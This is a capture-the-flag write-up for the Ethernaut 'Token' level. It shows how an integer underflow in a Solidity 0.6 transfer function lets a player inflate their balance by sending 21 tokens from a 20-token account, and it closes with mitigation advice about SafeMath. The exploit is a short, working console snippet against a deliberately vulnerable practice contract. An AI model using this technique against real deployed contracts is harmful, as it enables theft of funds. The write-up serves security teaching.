# 05. Token
<sup>Difficulty 3/10</sup>

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

## Solution

We notice two things:

```solidity
// 1. Solidity version is up to 0.6
pragma solidity ^0.6.0;

//[...]

// 2. Transfer function perform our math 
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

What's the link between them? **Overflows**

Until Solidity compiler 0.8.* math operations are subject to over and underflows, that's why the SafeMath module is used.

Note `MAX_INT == 2 ** 256 - 1`. `0 - 1 == MAX_INT`, so `MAX_INT + 1 == 0`, hence the solution is pretty straightforward:

```javascript
await contract.balanceOf(player)
// -> 0: 20
const fakeUser = '0x5B38Da6a701c568545dCfcB03FcB875f56beddC4'  // got from remix account
await contract.transfer(fakeUser, 21)
await contract.balanceOf(player)
// -> 0: 67108863
// 1: 67108863
// 2: 67108863
// 3: 67108863
// 4: 67108863
// 5: 67108863
// 6: 67108863
// 7: 67108863
// 8: 67108863
// 9: 4194303
```

This works because `balances[msg.sender] -= _value;` will set the MAX_INT value to the `msg.sender` that would be us. To keep our tokens the `_to` address has to be another account because `MAX_INT + 1 == 0` and we will loose all the accumulated tokens. Also, we set `_value` to 21 because we have 20 starting tokens.

## OZ Corner

Overflows are very common in solidity and must be checked for with control statements such as:

```solidity
if(a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```solidity
a = a.add(c);
```

If there is an overflow, the code will revert.